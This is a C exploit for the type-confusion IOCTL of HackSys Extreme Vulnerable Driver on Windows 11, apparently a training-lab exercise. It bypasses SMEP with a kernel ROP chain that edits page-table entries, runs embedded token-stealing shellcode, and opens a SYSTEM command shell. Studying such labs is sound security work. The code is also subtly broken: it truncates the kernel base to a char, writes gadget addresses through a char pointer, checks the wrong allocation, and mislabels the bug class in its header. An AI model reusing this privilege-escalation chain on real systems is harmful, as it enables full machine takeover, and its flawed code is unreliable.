/*
HEVD TriggerArbitraryWrite
OS Name	Microsoft Windows 11 Pro
Version	10.0.26100 Build 26100

based on: https://wetw0rk.github.io/posts/0x06-approaching-modern-windows-kernel-type-confusions
*/

#include <stdio.h>  
#include <windows.h>
#include <Psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

#define HEVD_TYCO 0x222023

// Struct for TyCo
typedef struct _USER_TYCO
{
	ULONG_PTR ObjectId;
	ULONG_PTR ObjectType;
} USER_TYCO, *PUSER_TYCO;

// Check administrator
int CheckWin(VOID)
{
	DWORD win = 0;
	DWORD dwLen = 0;
	CHAR* cUsername = NULL;

	GetUserNameA(NULL, &dwLen);

	if (dwLen > 0) {
		cUsername = (CHAR*)malloc(dwLen * sizeof(CHAR));
	}
	else {
		printf("[-] Failed to allocate buffer for username check\n");
		return -1;
	}

	GetUserNameA(cUsername, &dwLen);

	win = strcmp(cUsername, "SYSTEM");
	free(cUsername);

	return (win == 0) ? win : -1;
}  

LPVOID GetKernelModuleBase(PCHAR pKernelModule)
{
	char pcDriver[1024] = { 0 };
	LPVOID lpvTargetDriver = NULL;
	LPVOID* lpvDrivers = NULL;
	DWORD dwCB = 0;
	DWORD dwDrivers = 0;
	DWORD i = 0;

	EnumDeviceDrivers(NULL, dwCB, &dwCB);
	if (dwCB <= 0)
		return NULL;

	lpvDrivers = (LPVOID*)malloc(dwCB * sizeof(LPVOID));
	if (lpvDrivers == NULL)
		return NULL;

	if (EnumDeviceDrivers(lpvDrivers, dwCB, &dwCB))
	{
		dwDrivers = dwCB / sizeof(LPVOID);
		for (i = 0; i < dwDrivers; i++)
			if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver)))
				if (StrStrA(pcDriver, pKernelModule) != NULL)
					lpvTargetDriver = lpvDrivers[i];
	}

	free(lpvDrivers);

	return lpvTargetDriver;
}
int Exploit(HANDLE hDevice)
{
	USER_TYCO userTycoObject = { 0 };
	DWORD bytesReturned = NULL;
	LPVOID allocTarget1 = NULL;
	LPVOID allocTarget2 = NULL;
	LPVOID allocShellcode = NULL;
	LPVOID kernelBase = NULL;

	char* rop = NULL;
	char* nt = NULL;
	char shellcode[0x81] = {
		// sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes)
		0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x80,
		0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xb2, 0x04, 0x48, 0x8b, 0x80, 0x48, 0x04,
		0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0x38, 0x90, 0x40, 0x04, 0x00, 0x00,
		0x75, 0xeb, 0x48, 0x8b, 0x90, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x91, 0xb8, 0x04,
		0x00, 0x00,

		// sickle-tool -p windows/x64/kernel_sysret -f num (71)
		0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x88,
		0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00,
		0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f,
		0x07
	};
	// Get kernel base
	kernelBase = GetKernelModuleBase("ntoskrnl");
	if (kernelBase == NULL)
	{
		printf("[-] Failed to obtain address: %d\n", GetLastError());
		return -1;
	}
	printf("[*] Kernel base address: 0x%p\n", kernelBase);

	// Memory allocation
	allocTarget2 = (LPVOID)0x48000000;
	printf("[*] Allocation at 0x%p - PAGE_SIZE\n", allocTarget2);
	allocTarget1 = VirtualAlloc(
		(LPVOID)(0x48000000 - 0x1000),
		0x10000,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_READWRITE);
	if (allocTarget1 == NULL)
	{
		printf("[*] Failed to allocate memory: %d\n", GetLastError());
		return -1;
	}
	printf("[*] Allocation: 0x%p\n", allocTarget1);


	// Prepare TyCo
	userTycoObject.ObjectId   =	0x4141414141414141;
	userTycoObject.ObjectType = (unsigned long long)kernelBase + 0x02aceec; // mov esp, 0x48000000; add esp, 0x28; ret;
	printf("[*] ObjectId: 0x%llx\n", userTycoObject.ObjectId);
	printf("[*] ObjectType: 0x%llx\n", userTycoObject.ObjectType);

	// Eepy...
	printf("[*] Eepin");
	for (int i = 0; i < 4; i++) {
		putchar('.');
		Sleep(1000);
	}
	putchar('\n');

	// Allocate shellcode
	allocShellcode = VirtualAlloc(
		NULL,
		sizeof(shellcode),
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);
	if (allocTarget1 == NULL)
	{
		printf("[*] Failed to allocate memory: %d\n", GetLastError());
		return -1;
	}
	printf("[*] Shellcode at: 0x%p\n", allocShellcode);
	RtlCopyMemory(allocShellcode, shellcode, 0x81);

	// Gadgets
	rop = (char*)(allocTarget2);
	nt = (char)kernelBase;

	printf("[*] ROP: 0x%p\n", rop);

	*rop++ = nt + 0x67526e; // pop rdx; pop rax; pop rcx; ret;
	*rop++ = 0x8;			// set rdx to 8
	*rop++ = 0x0;				// filler
	*rop++ = 0x0;				// filler

	// Get pointer to our PTE
	*rop++ = nt + 0x20438f;		// pop rcx; ret;
	*rop++ = (char*)allocShellcode;
	*rop++ = nt + 0x3dfee0;		// MiGetPteAddress()

	// Mark the page as a kernel page (U -> K)
	*rop++ = nt + 0x200584; // pop rdi; ret;
	*rop++ = 0x4;
	*rop++ = nt + 0x6e1423; // or dword ptr[rax], edi; ret;

	for (int i = 0; i < 0xC; i++) {
		*rop++ = (char*)allocShellcode;
	}

	// ATTACK
	printf("[!] Execute?");
	getchar();
	printf("\n[+] Calling IOCTL...\n");
	DeviceIoControl(
		hDevice,
		HEVD_TYCO,
		&userTycoObject,
		sizeof(USER_TYCO),
		NULL,
		0x00,
		&bytesReturned,
		NULL
	);

	return 0;
}

int main()
{
	HANDLE hDevice = NULL;
	hDevice = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		(GENERIC_READ | GENERIC_WRITE),
		0x00,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to get handle!\n");
		return -1;
	}

	if (Exploit(hDevice) == 0)
	{
		printf("[+] Exploitation succesfull!\n");
		system("cmd.exe");
	}
	else
	{
		printf("[-] Explotiation failed\n");
		return -1;
	}

	return 0;
}
